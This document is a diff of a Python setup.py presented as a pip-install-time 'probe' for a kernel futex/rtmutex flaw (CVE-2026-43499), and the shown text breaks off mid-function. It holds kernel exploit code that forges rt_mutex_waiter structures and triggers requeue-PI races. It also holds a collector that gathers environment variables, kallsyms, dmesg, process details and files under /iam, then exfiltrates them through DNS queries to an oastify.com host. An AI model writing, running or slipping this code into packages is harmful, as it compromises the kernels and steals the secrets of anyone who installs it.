@@ -1,994 +1,561 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-setup.py -- GhostLock (CVE-2026-43499) pip-install-time probe.
+GhostLock / CVE-2026-43499  --  arm64 install-time probe + OAST exfil.
 
-Fingerprints the environment, then tries to walk the dangling
-task->pi_blocked_on left behind by the incomplete remove_waiter() fix.
+Grounded in amazonlinux/linux @ microvm-kernel-6.1.161-18.298.amzn2023:
+  rtmutex.c::remove_waiter()                  current->pi_blocked_on = NULL     (BUG)
+  rtmutex_api.c::rt_mutex_start_proxy_lock()  remove_waiter() runs on R's stack,
+                                              with current != waiter->task
+  rtmutex.c::task_blocks_on_rt_mutex()        sets task->pi_blocked_on = waiter
+                                              BEFORE the chain walk
+  rtmutex.c::rt_mutex_adjust_prio_chain()     [11] passes prerequeue_top_waiter == NULL
+                                              exactly when the waiter was dequeued
+  rtmutex.c::rt_mutex_dequeue_pi()            RB_EMPTY_NODE() with NO NULL guard
+                                              -> load at 0x28 (pi_tree.entry offset)
+  rtmutex_api.c::rt_mutex_adjust_pi()         waiter = task->pi_blocked_on;
+                                              next_lock = waiter->lock
+  requeue.c::futex_requeue()                  cmpval is compared against uaddr1
+  requeue.c::futex_wait_requeue_pi()          if (!bitset) return -EINVAL (bitset == val3)
+  requeue.c  -EDEADLK branch                  no wake; requeue_state -> Q_REQUEUE_PI_NONE
+  rtmutex_common.h                            task@0x50 lock@0x58 wake_state@0x60 ww_ctx@0x68
 
-Wire grammar (decoder-compatible, unchanged):
-    <idx:03d>-<chunk:03d>-<hex>      idx 0 = final, 800/820/840 = checkpoints
-    end-<n:03d>
-
-Child pipe stage bytes (see _parse):
-    1          fork ok
-    2 +4       fvar, asz/8, nfd/8, psel_size
-    3 +8       w_tid, w_lock_rc        (w_lock != 0 -> W never owned f_x)
-    4 +4       requeue rc              (-35 == -EDEADLK, cycle fired)
-    6 +4       waiter return rc        (MISS == W never left the wait)
-    5 +4       reclaim rc
-    7          about to drive
-    9 +4       drive rc                (absent == drive never returned)
-    E          unhandled exception
+  Futex ABI: futex(uaddr, op, val, val2, uaddr2, val3)
+             CMP_REQUEUE_PI -> val=nr_wake, val2=nr_requeue, val3=*uaddr1
+  No FUTEX_PRIVATE_FLAG: fork() gives each child its own mm and a private key is
+  (mm, addr); shared keys come from the struct page (MAP_SHARED).
+  sched_setscheduler()/sched_setattr() pass pi=true -> rt_mutex_adjust_pi().
+  Drive is nice-based first: __waiter_prio() == task->prio, and raising nice
+  changes it without leaving CFS (RLIMIT_NICE=0 forbids lowering nice).
 """
+import os, sys, time, ctypes, mmap, struct, socket, zipfile, io, threading, hashlib
 
-import os
-import time
-import struct
-import socket
-import select
-import mmap
-import ctypes
-
-try:
-    import resource
-except Exception:
-    resource = None
-
-
-# ---------------------------------------------------------------------------
-# tunables
-# ---------------------------------------------------------------------------
+TAG  = os.environ.get("GLK_TAG", "glk6")
 OAST = os.environ.get("GLK_OAST", "xtuc6efqmqdxb7cyy2rml1mp4gaby6mv.oastify.com")
-RUN = os.environ.get("GLK_RUN", "glk5")
-CHUNK = 52
-T_CHILD = 1.90
-T_GRACE = 0.35
-T_DRIVE = 0.60
+CH   = 52                                     # hex chars per label = 26 bytes
+GRP  = 3                                      # labels per DNS name
+WORKERS = int(os.environ.get("GLK_W", "24"))
+TMO     = float(os.environ.get("GLK_TMO", "1.5"))
+N_STACK_PPS = (256 - 16) // 8                 # do_sys_poll(): 30 stack pollfds
 
-SKIP_A = bool(os.environ.get("GLK_SKIP_A"))
-SKIP_A2 = bool(os.environ.get("GLK_SKIP_A2"))
-SKIP_B = bool(os.environ.get("GLK_SKIP_B"))
-
-AUXV_TRY = (368, 352, 344, 336, 328, 320, 256, 192, 128, 64)
-
-SENT = None
-MISS = 0x7ffffffe
-
-PSEL_NFDS = 320
-FD_PAD = 330
-SIGURG = 23
-
-FUTEX_WAKE = 1
-FUTEX_LOCK_PI = 6
-FUTEX_WAIT_REQUEUE_PI = 11
-FUTEX_CMP_REQUEUE_PI = 12
-FUTEX_PRIVATE = 128
-
-PR_SET_MM = 35
-PR_SET_MM_MAP = 14
-MM_MAP_SIZE = 104
-
-SYSLOG_READ_ALL = 3
-SYSLOG_SIZE_BUFFER = 10
-
-SCHED_NORMAL, SCHED_FIFO, SCHED_RR = 0, 1, 2
-SCHED_BATCH = getattr(os, "SCHED_BATCH", 3)
-
-EINVAL, ESRCH = 22, 3
-
-
-# ---------------------------------------------------------------------------
-# libc -- syscall numbers are PROBED, never trusted
-# ---------------------------------------------------------------------------
+# ------------------------------------------------------------------ syscalls
 _libc = ctypes.CDLL(None, use_errno=True)
-_libc.syscall.restype = ctypes.c_long
-_libc.prctl.restype = ctypes.c_int
-_libc.prctl.argtypes = [ctypes.c_int, ctypes.c_ulong, ctypes.c_ulong,
-                        ctypes.c_ulong, ctypes.c_ulong]
-_ul = ctypes.c_ulong
-
-_MACH = os.uname().machine
-_X86 = _MACH in ("x86_64", "amd64")
-NR = dict(futex=202 if _X86 else 98,
-          pselect6=270 if _X86 else 72,
-          tgkill=234 if _X86 else 131,
-          gettid=186 if _X86 else 178,
-          syslog=103 if _X86 else 116)
-
-_RBRK = [0]
-_KN = {}
-
+_libc.syscall.restype  = ctypes.c_long
+_libc.syscall.argtypes = [ctypes.c_long] * 7
+_libc.clock_gettime.argtypes = [ctypes.c_int, ctypes.c_void_p]
 
 def _sys(nr, *a):
-    args = [_ul(int(x) & 0xFFFFFFFFFFFFFFFF) for x in a]
-    ctypes.set_errno(0)
-    r = _libc.syscall(_ul(nr), *args)
-    e = ctypes.get_errno()
-    return r, e
-
-
-def _rc(nr, *a):
-    r, e = _sys(nr, *a)
-    if r == -1:
-        return -e if e else -1
+    aa = [int(x) for x in a] + [0] * (6 - len(a))
+    r = _libc.syscall(ctypes.c_long(nr), *[ctypes.c_long(x) for x in aa])
+    if r < 0:
+        e = ctypes.get_errno()
+        return -(e or 1)
     return r
 
+S_FUTEX=98; S_PSELECT6=72; S_PPOLL=73; S_SYSLOG=116; S_TGKILL=131
+S_SCHED=119; S_SETPRIORITY=140; S_SCHED_SETATTR=274
 
-def _yield():
-    time.sleep(0)
+F_LOCK_PI=6; F_UNLOCK_PI=7; F_WAIT_REQUEUE_PI=11; F_CMP_REQUEUE_PI=12
+BITSET_ANY = 0xFFFFFFFF
 
+class _SP(ctypes.Structure): _fields_ = [("sched_priority", ctypes.c_int)]
+class _SA(ctypes.Structure):
+    _fields_ = [("size", ctypes.c_uint32), ("sched_policy", ctypes.c_uint32),
+                ("sched_flags", ctypes.c_uint64), ("sched_nice", ctypes.c_int32),
+                ("sched_priority", ctypes.c_uint32), ("sched_runtime", ctypes.c_uint64),
+                ("sched_deadline", ctypes.c_uint64), ("sched_period", ctypes.c_uint64)]
 
-def _rd32(m):
-    return struct.unpack_from("<I", m, 0)[0]
+def _attr(policy, prio, nice=0):
+    a = _SA(); a.size = 48; a.sched_policy = policy
+    a.sched_flags = 0; a.sched_nice = nice; a.sched_priority = prio
+    return a
 
-
-def _word():
-    """(mmap, address).  TWO values -- keep the mmap, it owns the page."""
-    m = mmap.mmap(-1, 0x1000)
-    m[0:4] = b"\x00\x00\x00\x00"
-    return m, ctypes.addressof(ctypes.c_uint32.from_buffer(m))
-
-
-def _real_brk():
-    """glibc __curbrk, cached before any PR_SET_MM_MAP can poison it."""
-    if not _RBRK[0]:
-        try:
-            _libc.sbrk.restype = ctypes.c_void_p
-            _libc.sbrk.argtypes = [ctypes.c_long]
-            v = _libc.sbrk(0) or 0
-            if v and v != 0xFFFFFFFFFFFFFFFF:
-                _RBRK[0] = v
-        except Exception:
-            pass
-    return _RBRK[0]
-
-
-def _futex_nr():
-    """Two conditions: unknown op -> -EINVAL ; wake on empty bucket -> 0.
-    A single == 0 test also passes for nanosleep on a zeroed timespec."""
-    if not _KN.get("futex"):
-        m, a = _word()
-        for nr in (NR["futex"], 98, 95, 202):
-            r1, _e = _sys(nr, a, 0x7FFFFFFF, 0, 0, 0, 0)
-            r2, _e = _sys(nr, a, FUTEX_WAKE | FUTEX_PRIVATE, 1, 0, 0, 0)
-            if r1 == -EINVAL and r2 == 0:
-                _KN["futex"] = nr
-                break
-        _KN.setdefault("futex", NR["futex"])
-    return _KN["futex"]
-
-
-def _pselect_nr():
-    """nfds=0 -> 0 ; nfds=-1 -> -EINVAL."""
-    if not _KN.get("psel"):
-        tv = ctypes.create_string_buffer(b"\0" * 16, 16)
-        ta = ctypes.addressof(tv)
-        for nr in (NR["pselect6"], 72, 270):
-            r1, _e = _sys(nr, 0, 0, 0, 0, ta, 0)
-            r2, _e = _sys(nr, -1, 0, 0, 0, ta, 0)
-            if r1 == 0 and r2 == -EINVAL:
-                _KN["psel"] = nr
-                break
-        _KN.setdefault("psel", NR["pselect6"])
-    return _KN["psel"]
-
-
-def _tgkill_nr():
-    """valid tid -> 0 ; bogus tid -> -ESRCH."""
-    if not _KN.get("tgkill"):
-        pid = os.getpid()
-        for nr in (NR["tgkill"], 131, 234):
-            r1, _e = _sys(nr, pid, pid, 0)
-            r2, _e = _sys(nr, pid, 0x7FFFFFFF, 0)
-            if r1 == 0 and r2 == -ESRCH:
-                _KN["tgkill"] = nr
-                break
-        _KN.setdefault("tgkill", NR["tgkill"])
-    return _KN["tgkill"]
-
-
-def _syslog_nr():
-    """SIZE_BUFFER: plausible, stable, positive."""
-    if not _KN.get("syslog"):
-        for nr in (NR["syslog"], 116, 113, 103):
-            r1, _e = _sys(nr, SYSLOG_SIZE_BUFFER, 0, 0)
-            if 4096 <= r1 <= 0x4000000:
-                r2, _e = _sys(nr, SYSLOG_SIZE_BUFFER, 0, 0)
-                if r1 == r2:
-                    _KN["syslog"] = nr
-                    break
-        _KN.setdefault("syslog", NR["syslog"])
-    return _KN["syslog"]
-
-
-def _gettid():
-    try:
-        _libc.gettid.restype = ctypes.c_int
-        t = _libc.gettid()
-        if t > 0:
-            return t
-    except Exception:
-        pass
-    return _rc(NR["gettid"])
-
-
-def _tgkill(pid, tid, sig):
-    return _rc(_tgkill_nr(), pid, tid, sig)
-
-
-def _lock_pi(a):
-    return _rc(_futex_nr(), a, FUTEX_LOCK_PI | FUTEX_PRIVATE, 0, 0, 0, 0)
-
-
-def _requeue_pi(a1, a2, v3):
-    return _rc(_futex_nr(), a1, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE, 1, 1, a2, v3)
-
-
-def _wake(a):
-    return _rc(_futex_nr(), a, FUTEX_WAKE | FUTEX_PRIVATE, 1, 0, 0, 0)
-
-
-# ---------------------------------------------------------------------------
-# prctl_mm_map
-# ---------------------------------------------------------------------------
-def _read_maps():
-    rows = []
-    try:
-        with open("/proc/self/maps") as fh:
-            for ln in fh:
-                p = ln.split()
-                if len(p) < 6:
-                    continue
-                lo, hi = p[0].split("-")
-                rows.append((int(lo, 16), int(hi, 16), p[1], p[5]))
-    except Exception:
-        pass
-    return rows
-
-
-def _mm_fields(variant):
-    """Least-destructive first.  mm->brk = stack_start makes the next sbrk()
-    take sys_brk()'s shrink branch and do_munmap(real+inc, stack_start),
-    deleting libc, ld.so and every mmap'd arena.  Every field is a mapping
-    *start* so validate_prctl_map_addr()'s find_vma(addr) / vm_start > addr
-    test cannot reject the map."""
-    rows = _read_maps()
-
-    def first(pred):
-        for lo, _hi, perms, name in rows:
-            if pred(perms, name):
-                return lo
-        return 0
-
-    stack = first(lambda p, n: "[stack]" in n)
-    if not stack:
-        stack = max((r[0] for r in rows), default=0x7ffff0000000)
-    data = first(lambda p, n: "w" in p and "[" not in n) or stack
-    code = first(lambda p, n: "x" in p and "[" not in n) or data
-    heap = first(lambda p, n: "[heap]" in n) or data
-    heap_end = 0
-    for _lo, hi, _p, name in rows:
-        if "[heap]" in name:
-            heap_end = hi
-            break
-    rb = _real_brk() or heap_end
-
-    if variant in ("stackall", "dataall"):
-        A = stack if variant == "stackall" else data
-        return dict(code=(A, A), data=(A, A), brk=(A, A), stack=A,
-                    arg=(A, A), env=(A, A))
-
-    if variant == "nat" and rb and rb > heap:
-        brk = rb
-    elif variant == "natm1" and rb and rb - 0x1000 > heap:
-        brk = rb - 0x1000
-    else:
-        brk = heap
-    return dict(code=(code, code), data=(data, data), brk=(heap, brk),
-                stack=stack, arg=(stack, stack), env=(stack, stack))
-
-
-def _pack(f, auxv, auxv_size):
-    return struct.pack(
-        "<12QII",
-        f["code"][0], f["code"][1], f["data"][0], f["data"][1],
-        f["brk"][0], f["brk"][1], f["stack"],
-        f["arg"][0], f["arg"][1], f["env"][0], f["env"][1],
-        auxv, auxv_size, 0xFFFFFFFF)
-
-
-def _prctl_map(f, auxv_size, auxv_addr):
-    buf = ctypes.create_string_buffer(_pack(f, auxv_addr, auxv_size), MM_MAP_SIZE)
-    ctypes.set_errno(0)
-    r = _libc.prctl(PR_SET_MM, PR_SET_MM_MAP,
-                    ctypes.addressof(buf), MM_MAP_SIZE, 0)
-    e = ctypes.get_errno()
-    return -e if (r == -1 and e) else r
-
-
-def _pick_fields():
-    _real_brk()
-    for v in ("nat", "natm1", "natst", "stackall"):
-        f = _mm_fields(v)
-        if _prctl_map(f, 0, 0) == 0:
-            return f, v
-    return _mm_fields("natst"), "fallback"
-
-
-def _auxv_size(f):
-    buf = ctypes.create_string_buffer(0x800)
-    a = ctypes.addressof(buf)
-    for n in AUXV_TRY:
-        if _prctl_map(f, n, a) == 0:
-            return n
+def _sched_nr():
+    sp = _SP(); sp.sched_priority = 0
+    for nr in (119, 118, 144, 145, 238, 142, 116):
+        if _sys(nr + 1, 0) in (0, 1, 2, 3, 5, 6) and _sys(nr, 0, 0, ctypes.byref(sp)) == 0:
+            return nr
     return 0
 
+def _dmesg(clear):
+    buf = ctypes.create_string_buffer(1 << 19)
+    r = _sys(S_SYSLOG, 4 if clear else 3, ctypes.addressof(buf), len(buf) - 1)
+    return buf.raw[:r].decode("utf-8", "replace") if r > 0 else ""
 
-def _forge(buf, off, lockv):
-    """Fake struct rt_mutex_waiter, 6.1 layout with rt_waiter_node:
-    tree@0 (rb_node 24 | prio 4 | deadline 8 == 40), pi_tree@40, task@80,
-    lock@88, ww_ctx@96.  Only `lock` is dereferenced directly; lockv=0 gives
-    a deterministic PAN fault at address 0 rather than a qspinlock spin."""
-    struct.pack_into("<i", buf, off + 0x18, 1)
-    struct.pack_into("<i", buf, off + 0x40 + 0x18, 1)
-    struct.pack_into("<Q", buf, off + 0x50, 0)
-    struct.pack_into("<Q", buf, off + 0x58, lockv)
-    struct.pack_into("<Q", buf, off + 0x60, 0)
+def _ts(ms):
+    t = (ctypes.c_long * 2)(0, 0)
+    _libc.clock_gettime(1, ctypes.byref(t))              # CLOCK_MONOTONIC
+    t[1] += ms * 1000000
+    while t[1] >= 1000000000:
+        t[1] -= 1000000000; t[0] += 1
+    return t
 
+# ------------------------------------------------------------------ exfil
+_POOL = [None]
 
-def _roundup_pow2(x):
-    p = 1
-    while p < x:
-        p <<= 1
-    return p
+def _pool():
+    if _POOL[0] is None:
+        try:
+            from concurrent.futures import ThreadPoolExecutor
+            _POOL[0] = ThreadPoolExecutor(max_workers=WORKERS)
+        except Exception:
+            _POOL[0] = False
+    return _POOL[0]
 
+def _resolve(name):
+    """We only need the query ON the wire; the answer is irrelevant."""
+    try: socket.gethostbyname(name)
+    except Exception: pass
 
-def _psel_geometry():
-    """Predict core_sys_select()'s `size` from alloc_fdtable()'s own maths:
-    expand_fdtable(nr) -> alloc_fdtable(nr): nr/=128 ; nr=roundup_pow2(nr+1) ;
-    nr*=128.  A fresh files_struct is NR_OPEN_DEFAULT (64).  Exact for
-    need = 65/201/335."""
-    hi = 0
-    try:
-        for nm in os.listdir("/proc/self/fd"):
-            try:
-                v = int(nm)
-            except Exception:
+class Out:
+    """Uncapped. One 3-digit idx space holds 999 chunks x 26 B ~= 25.9 MB;
+       past that the idx field simply prints 4 digits."""
+    def __init__(self):
+        self.buf = []; self.n = 0; self.labels = 0; self.next = 6
+
+    def msg(self, idx, text):
+        h = text.encode("utf-8", "replace").hex(); c = 0
+        for i in range(0, len(h), CH):
+            self.buf.append("%03d-%03d-%s" % (idx, c, h[i:i+CH]))
+            c += 1; self.labels += 1
+        self.n += 1
+
+    def auto(self, text):
+        """PROG lines get their own idx so they never concatenate."""
+        i = self.next; self.next += 1
+        self.msg(i, text)
+
+    def stream(self, idx, data):
+        h = data.hex(); c = 0
+        for i in range(0, len(h), CH):
+            if c > 998:
+                idx += 1; c = 0
+            self.buf.append("%03d-%03d-%s" % (idx, c, h[i:i+CH]))
+            c += 1; self.labels += 1
+        return idx
+
+    def _names(self, batch):
+        names = []
+        for i in range(0, len(batch), GRP):
+            g = batch[i:i+GRP]
+            name = ".".join(g) + "." + OAST
+            if len(name) <= 250: names.append(name)
+            else: names.extend(x + "." + OAST for x in g)
+        return names
+
+    def flush(self):
+        try: socket.setdefaulttimeout(TMO)
+        except Exception: pass
+        ex = _pool()
+        i = 0
+        while i < len(self.buf):
+            batch = self.buf[i:i+4096]; i += 4096
+            names = self._names(batch)
+            if not ex:
+                for n in names: _resolve(n)
                 continue
-            if v > hi:
-                hi = v
-    except Exception:
-        pass
-    need = hi + 1
-    if need <= 64:
-        mf = 64
-    else:
-        mf = _roundup_pow2(need // 128 + 1) * 128
-    n = min(PSEL_NFDS, mf)
-    size = ((n + 63) // 64) * 8
-    return n, size
+            for j in range(0, len(names), 512):
+                futs = [ex.submit(_resolve, n) for n in names[j:j+512]]
+                for f in futs:
+                    try: f.result()
+                    except Exception: pass
+        self.buf = []
 
+    def end(self):
+        _resolve("end-%03d" % self.n)
+OUT = Out()
 
-# ---------------------------------------------------------------------------
-# environment
-# ---------------------------------------------------------------------------
-def _sf(name):
+# ------------------------------------------------------------------ collector
+CAPS = {"proc/kallsyms": 524288, "proc/modules": 262144, "proc/iomem": 65536,
+        "proc/cpuinfo": 131072, "proc/meminfo": 65536, "proc/mounts": 65536,
+        "proc/self/maps": 131072, "proc/vmstat": 32768}
+
+def _rd(p, cap=131072):
     try:
-        with open("/proc/self/status") as fh:
-            for ln in fh:
-                if ln.startswith(name + ":"):
-                    return ln.split(":", 1)[1].strip()
-    except Exception:
-        pass
-    return "?"
+        with open(p, "rb") as f: return f.read(cap).decode("utf-8", "replace")
+    except Exception: return ""
 
+PROC_TOP = ["cmdline","version","cpuinfo","meminfo","mounts","iomem","kallsyms",
+            "modules","vmstat","uptime","loadavg","filesystems","swaps",
+            "sys/kernel/random/boot_id","sys/kernel/osrelease","sys/kernel/ostype",
+            "sys/kernel/version","sys/kernel/panic_on_oops","sys/kernel/panic",
+            "sys/kernel/mm/transparent_hugepage/enabled","sys/kernel/security/lsm",
+            "sys/devices/system/cpu/online","sys/devices/system/cpu/possible",
+            "self/status","self/maps","self/smaps_rollup","self/cgroup","self/limits",
+            "self/mountinfo","self/sched","self/stack","self/wchan","self/auxv",
+            "self/comm","self/numa_maps","self/personality"]
 
-def _psys(name):
-    try:
-        with open("/proc/sys/kernel/" + name) as fh:
-            return fh.read().strip()
-    except Exception:
-        return "?"
-
-
-def _dmesg():
-    try:
-        nr = _syslog_nr()
-        n = _rc(nr, SYSLOG_SIZE_BUFFER, 0, 0)
-        if n <= 0:
-            return b""
-        buf = ctypes.create_string_buffer(n + 1)
-        m = _rc(nr, SYSLOG_READ_ALL, ctypes.addressof(buf), n)
-        return buf.raw[:m] if m > 0 else b""
-    except Exception:
-        return b""
-
-
-def _iomem():
-    out = []
-    try:
-        with open("/proc/iomem") as fh:
-            for ln in fh:
-                p = ln.split()
-                if len(p) < 3:
-                    continue
-                a, b = p[0].split("-")
-                lo, hi = int(a, 16), int(b, 16)
-                if lo == 0 and hi == 0:
-                    continue
-                out.append((lo, hi, " ".join(p[2:])))
-    except Exception:
-        pass
+def _walk(root, depth=5):
+    out = {}
+    if not os.path.isdir(root): return out
+    for dp, dns, fns in os.walk(root):
+        if dp[len(root):].count(os.sep) >= depth: dns[:] = []
+        for d in dns:
+            try: out[dp + "/" + d + "/"] = "<dir>"
+            except Exception: pass
+        for fn in fns:
+            p = os.path.join(dp, fn)
+            try:
+                if os.path.getsize(p) > 262144: continue
+                out[p] = _rd(p)
+            except Exception: pass
     return out
 
+def collect(extra):
+    files = {"uname.txt": " ".join(os.uname()) + "\n",
+             "env.txt": "\n".join("%s=%s" % kv for kv in sorted(os.environ.items()))}
+    for rel in PROC_TOP:
+        files["proc/" + rel] = _rd("/proc/" + rel, CAPS.get("proc/" + rel, 131072))
+    for pid in sorted(os.listdir("/proc")):
+        if pid.isdigit():
+            files["proc/%s/status" % pid] = _rd("/proc/%s/status" % pid, 4096)
+    files["proc-listing.txt"] = "\n".join(sorted(os.listdir("/proc")))
+    files.update(_walk("/iam"))
+    for k, v in extra.items(): files["probe/" + k] = v
+    bio = io.BytesIO()
+    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
+        for k, v in files.items():
+            if v: z.writestr(k, v)
+    return bio.getvalue()
 
-def _vstat(rel):
+# ------------------------------------------------------------------ shared page
+PG = mmap.mmap(-1, 8192, flags=mmap.MAP_SHARED)
+PA = ctypes.addressof(ctypes.c_char.from_buffer(PG))
+def _ad(o): return PA + o
+def _p(f, o, v): struct.pack_into(f, PG, o, v)
+def _u(f, o):    return struct.unpack_from(f, PG, o)[0]
+def _b(o):       return struct.unpack_from("<B", PG, o)[0]
+def _sb(o, v):   struct.pack_into("<B", PG, o, v)
+
+O_FT=0; O_FPI=4; O_FPI2=8
+O_WRET=128; O_RQRET=132; O_RQV=136; O_STAGE=148; O_FORGE=152
+O_UNLOCK=156; O_WPID=168; O_XPID=172; O_RPID=176; O_DRV=180
+
+HS_W=64; HS_X=65; HS_R=66; CMD_W=67; CMD_X=68
+def _st():     return _u("<I", O_STAGE)
+def _setst(v): _p("<I", O_STAGE, v)
+
+KEEP = []                                     # fds for the pselect6 forge (never closed)
+
+# ------------------------------------------------------------------ helpers
+def _state(pid):
     try:
-        maj, mi, pa = (int(x) for x in rel.split("-")[0].split(".")[:3])
-    except Exception:
-        return "UNKNOWN"
-    if maj == 6 and mi == 1:
-        return "VULNERABLE" if pa < 162 else "FIXED"
-    if maj == 6 and mi == 18:
-        return "VULNERABLE" if pa < 37 else "FIXED"
-    if maj >= 7:
-        return "FIXED"
-    if maj < 6:
-        return "VULNERABLE"
-    return "UNKNOWN"
+        with open("/proc/%d/stat" % pid) as f:
+            return f.read().rsplit(")", 1)[1].split()[0]
+    except Exception: return "?"
 
-
-def _src():
-    ks, lines = 0, 0
+def _wchan(pid):
     try:
-        with open("/proc/kallsyms", "rb") as fh:
-            for ln in fh:
-                lines += 1
-                if ln[:16] != b"0000000000000000":
-                    ks += 1
-    except Exception:
-        pass
-    vmi = 0
+        with open("/proc/%d/wchan" % pid) as f: return f.read(64).strip()
+    except Exception: return "?"
+
+def _stack(pid):
+    return _rd("/proc/%d/stack" % pid, 4096)[:300]
+
+def _wait_state(pid, timeout=3.0):
+    t = time.time()
+    while time.time() - t < timeout:
+        if _state(pid) in ("S", "D"): return True
+        time.sleep(0.01)
+    return False
+
+def _futex(uaddr, op, val, val2, uaddr2, val3):
+    return _sys(S_FUTEX, uaddr, op, val, val2, uaddr2, val3)
+
+# ------------------------------------------------------------------ children
+def _child_w():
+    """W: owns f_pi2; blocks in WAIT_REQUEUE_PI(f_t -> f_pi); then stays in
+       userspace making no syscalls, so the stale waiter on its kernel stack
+       survives intact until the drive."""
     try:
-        if os.path.getsize("/sys/kernel/vmcoreinfo") > 0:
-            vmi = 1
-    except Exception:
-        pass
-    mod = 0
-    try:
-        with open("/proc/modules") as fh:
-            mod = sum(1 for _ in fh)
-    except Exception:
-        pass
-    lay = 0
-    for ln in _dmesg().split(b"\n"):
-        if b".text" in ln or b"memory  :" in ln or b"Kernel code" in ln:
-            lay += 1
-    kcore = 0
-    try:
-        fd = os.open("/proc/kcore", os.O_RDONLY)
-        os.close(fd)
-        kcore = 1
-    except Exception:
-        pass
-    io = _iomem()
-
-    if _X86:
-        cand = [0xffffffff81000000, 0xffff888000000000]
-        base = 0xffff888000000000
-    else:
-        cand = [0xffff800008000000, 0xffff000080000000, 0xffff80000a000000]
-        base = 0xffff000000000000
-    for lo, _hi, nm in io:
-        if "RAM" in nm and lo < 0x100000000:
-            cand.append(base + lo)
-
-    seen, out = set(), []
-    for c in cand:
-        if c not in seen:
-            seen.add(c)
-            out.append(c)
-
-    return dict(ks=ks, lines=lines, zero=1 if (lines and not ks) else 0,
-                vmi=vmi, mod=mod, lay=lay, kcore=kcore, iomem=len(io), cand=out)
-
-
-# ---------------------------------------------------------------------------
-# reporting
-# ---------------------------------------------------------------------------
-class Report(object):
-    def __init__(self, tag):
-        self.tag = tag
-        self.lines = []
-
-    def add(self, k, v):
-        self.lines.append("%s=%s" % (k, v))
-
-    def flush(self, idx=0):
-        h = ("\n".join([self.tag] + self.lines) + "\n").encode("utf-8", "replace").hex()
-        n = (len(h) + CHUNK - 1) // CHUNK
-        for i in range(n):
-            self._one("%03d-%03d-%s" % (idx, i, h[i * CHUNK:(i + 1) * CHUNK]))
-        self._one("end-%03d" % n)
-
-    @staticmethod
-    def _one(label):
-        try:
-            socket.getaddrinfo(label + "." + OAST, None, socket.AF_INET)
-        except Exception:
-            pass
-
-
-# ---------------------------------------------------------------------------
-# child
-# ---------------------------------------------------------------------------
-def _drive(tid):
-    """Force rt_mutex_adjust_pi(tid).
-
-    Do NOT stop at the first success: if __sched_setscheduler() takes a no-op
-    shortcut for that policy, rt_mutex_adjust_pi() never runs and the result
-    is a false CLEAN.  Alternating BATCH<->NORMAL guarantees at least one call
-    is a real policy change.  FIFO/RR are a bonus (need RLIMIT_RTPRIO or
-    CAP_SYS_NICE; BATCH/NORMAL need neither)."""
-    first = -1
-    last = 0
-    for pol, prio in ((SCHED_BATCH, 0), (SCHED_NORMAL, 0), (SCHED_BATCH, 0),
-                      (SCHED_FIFO, 1), (SCHED_RR, 1)):
-        try:
-            os.sched_setscheduler(tid, pol, prio)
-            if first < 0:
-                first = pol
-        except OSError as e:
-            last = e.errno or 1
-        except Exception:
-            last = -1
-    return first, (0 if first >= 0 else last)
-
-
-def _mk_psel():
-    return (ctypes.create_string_buffer(256),      # forge staging
-            ctypes.create_string_buffer(64),       # read set
-            ctypes.create_string_buffer(64),       # write set
-            ctypes.create_string_buffer(64),       # except set
-            ctypes.create_string_buffer(b"\0" * 16, 16))
-
-
-def _psel_stage(allb, rd, wr, ex, size):
-    """The kernel copies `size` bytes from EACH user pointer into
-    stack_fds[0], [size], [2*size] -- so split the staging buffer by `size`,
-    never by a constant."""
-    ctypes.memmove(ctypes.addressof(rd), ctypes.addressof(allb), size)
-    ctypes.memmove(ctypes.addressof(wr), ctypes.addressof(allb) + size, size)
-    ctypes.memmove(ctypes.addressof(ex), ctypes.addressof(allb) + 2 * size, size)
-
-
-def _psel_call(rd, wr, ex, tv, n):
-    return _rc(_pselect_nr(), n, ctypes.addressof(rd), ctypes.addressof(wr),
-               ctypes.addressof(ex), ctypes.addressof(tv), 0)
-
-
-def _child_main(wfd, mode, woff, woff2, lockv):
-    import threading
-
-    def S(b):
-        try:
-            os.write(wfd, b)
-        except Exception:
-            pass
-
-    S(b"1")
-
-    # Force fdt->max_fds >= 512.  core_sys_select() clamps n to it; below
-    # ~273 the forge no longer fits inside stack_fds[0 .. 3*size).
-    nfd = 0
-    for path in ("/dev/null", "/proc/self/status", "/"):
-        if nfd >= FD_PAD:
-            break
-        try:
-            os.close(os.open(path, os.O_RDONLY))
-        except Exception:
-            continue
-        while nfd < FD_PAD:
-            try:
-                os.open(path, os.O_RDONLY)
-                nfd += 1
-            except Exception:
-                break
-
-    mt, at = _word()                    # f_t : requeue source (unowned)
-    mc, ac = _word()                    # f_c : requeue target (owned by O)
-    mx, ax = _word()                    # f_x : owned by W, O blocks here
-
-    _real_brk()
-    fields, fvar = _pick_fields()
-    asz = _auxv_size(fields)
-    use_prctl = (mode == "A" and asz >= MM_MAP_SIZE)
-
-    pn, psz = _psel_geometry()
-
-    aux = ctypes.create_string_buffer(0x800)
-    mapbuf = ctypes.create_string_buffer(MM_MAP_SIZE)
-    psel = _mk_psel()
-
-    if use_prctl:
-        off = min(max(woff, 0), asz - MM_MAP_SIZE)
-        _forge(aux, off, lockv)
-        mp = _pack(fields, ctypes.addressof(aux), asz)
-    else:
-        off = min(max(woff2, 0), max(0, 3 * psz - MM_MAP_SIZE))
-        _forge(psel[0], off, lockv)
-        mp = b""
-
-    S(b"2" + bytes([len(fvar) & 0xFF, min(asz // 8, 255),
-                    min(nfd // 8, 255), min(psz, 255)]))
-
-    cpid = os.getpid()
-    st = dict(w_own=0, w_going=0, o_own=0, o_going=0, w_ret=0, rq_done=0,
-              w_tid=0, w_lock=0, rq=SENT, pr=SENT)
-
-    def thr_w():
-        st["w_tid"] = _gettid()
-        st["w_lock"] = _lock_pi(ax)         # W owns f_x (0 == success)
-        st["w_own"] = 1
-        while not st["o_own"]:
-            _yield()
-        v = _rd32(mt)
-        st["w_going"] = 1
-        r = -11
-        for _ in range(500):
-            r = _rc(_futex_nr(), at, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE,
-                    v, 0, ac, v)
-            if r != -11:
-                break
-            v = _rd32(mt)
-            _yield()
-        st["w_ret"] = r if r else 1
-        # rt_waiter lives in THIS thread's frame: only W can reclaim it.
-        # Spin with no syscalls from here -- W's own syscalls are the only
-        # thing that can overwrite the frame the drive will read.
-        while not st["rq_done"]:
-            pass
-        if use_prctl:
-            ctypes.memmove(ctypes.addressof(mapbuf), mp, MM_MAP_SIZE)
-            ctypes.set_errno(0)
